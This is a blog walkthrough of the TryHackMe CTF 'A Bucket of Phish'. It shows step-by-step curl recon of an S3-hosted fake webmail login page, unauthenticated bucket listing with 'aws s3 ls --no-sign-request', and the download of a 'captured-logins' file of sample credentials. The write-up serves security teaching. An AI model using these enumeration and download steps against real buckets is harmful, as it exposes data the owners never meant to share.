---
title: "A Bucket of Phish CTF TryHackMe Walkthrough"
slug: a-bucket-of-phish
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

![](https://github.com/j4ke-exe/j4ke.io/assets/media/a-bucket-of-phish-banner.jpeg){: .center-image }

In this TryHackMe CTF challenge, A Bucket of Phish, we’ll go step-by-step through finding and exploiting a misconfigured AWS S3 bucket. The bucket hosts a static version of a CMail login page, and with a bit of investigation, we’re able to dig deeper and ultimately pull a list of compromised users.

<br>
## Step 1: Initial Recon

Target domain:

```bash
http://darkinjector-phish.s3-website-us-west-2.amazonaws.com
```

![](https://github.com/j4ke-exe/j4ke.io/assets/media/a-bucket-of-phish-cmail.jpeg){: .center-image }

We inspect the website content to understand what kind of application is hosted.

```bash
curl http://darkinjector-phish.s3-website-us-west-2.amazonaws.com
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cmail Webmail Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        .login-container h1 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #45a049;
        }
        .login-container .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>Cmail Login</h1>
    <form action="/login" method="POST">
        <label for="email">Email Address</label>
        <input type="text" id="email" name="email" placeholder="Enter your email" required>

        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required>

        <button type="submit">Login</button>
    </form>

    <div class="footer">
        <p>Forgot your password? <a href="/reset-password">Reset it here</a></p>
    </div>
</div>

</body>
</html>
```

### Observations:
- The page displays a styled HTML login form for **CMail Webmail**.
- The form action points to `/login`, and there's a password reset link to `/reset-password`.
- However, because this is hosted on **Amazon S3 static website hosting**, it doesn't support dynamic back-end functionality.

```bash
curl http://darkinjector-phish.s3-website-us-west-2.amazonaws.com/reset-password
```

```html
<html>
<head><title>404 Not Found</title></head>
<body>
<h1>404 Not Found</h1>
<ul>
<li>Code: NoSuchKey</li>
<li>Message: The specified key does not exist.</li>
<li>Key: reset-password</li>
<li>RequestId: EN4SKKZ1VKK91P9T</li>
<li>HostId: eGjEBRKU/BUWSzBefb8eYERlkKeG4qeKb0TT3IFWzraJibJsV6oqqt/j5nuCdojgAcTw1TqwGHY=</li>
</ul>
<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
<ul>
<li>Code: NoSuchKey</li>
<li>Message: The specified key does not exist.</li>
<li>Key: error.html</li>
</ul>
<hr/>
</body>
</html>
```

<br>

## Step 2: Validate Hosting Type

We verify the type of hosting and server technology by viewing headers:

```bash
curl -I http://darkinjector-phish.s3-website-us-west-2.amazonaws.com
```

```bash
HTTP/1.1 200 OK
x-amz-id-2: y6mmGEQad0NaD02ile8U97LzaR89gBpdoWeLojjLKGEKKauo2+qSGRSewEWQX5JO4c0BZBeZ3/c=
x-amz-request-id: HGSZRZX8MAQCVP1N
Date: Fri, 23 May 2025 20:53:58 GMT
Last-Modified: Mon, 17 Mar 2025 06:25:33 GMT
ETag: "3b392b5fc343b899cc3d67b6ecb2d025"
Content-Type: text/html
Content-Length: 2300
Server: AmazonS3
```

### Response:
```
Server: AmazonS3
```

This confirms the website is served directly from an S3 bucket.

<br>

## Step 3: Enumerate the S3 Bucket

Amazon S3 static websites often use the format:
```
http://<bucket-name>.s3-website-<region>.amazonaws.com
```

From this, we can identify the bucket name:
```
darkinjector-phish
```

We attempt to list contents without authentication (public enumeration).

```bash
aws s3 ls s3://darkinjector-phish --recursive --no-sign-request
```

### Output:
```
2025-05-23 19:58:04     4912 index.html
2025-05-23 20:01:17     1456 captured-logins-093582390
```

<br>

## Step 4: Retrieve the Flag

Download the file titled `captured-logins-093582390`.

```bash
aws s3 cp s3://darkinjector-phish/captured-logins-093582390 ./ --no-sign-request
```

```bash
cat captured-logins-093582390
```

```bash
user,pass
munra@thm.thm,Password123
test@thm.thm,123456
mario@thm.thm,Mario123
flag@thm.thm,THM{REDACTED}
```

<br>

### Notes & Lessons Learned

- Static S3 websites **do not support server-side logic**. Attempting `/login` or `/reset-password` will fail or return 404 errors.
- If the bucket is public, you can **list and download files without authentication** using `--no-sign-request`.
- Always validate headers and structure to determine if the target is an S3 static site.
- This is a **common misconfiguration vulnerability** in cloud storage security.

<br>

### Installation of `awscli`:

**macOS (Homebrew):**
```bash
brew install awscli
```

**Kali Linux / Debian-based:**
```bash
sudo apt update && sudo apt install awscli
```

**Windows PowerShell:**
```powershell
msiexec.exe /i https://awscli.amazonaws.com/AWSCLIV2.msi
```

<br>

## Responsible Disclosure

If you encounter this in the real world outside of a CTF or test environment, **always disclose responsibly** through a coordinated vulnerability disclosure program or the organization’s security contact.
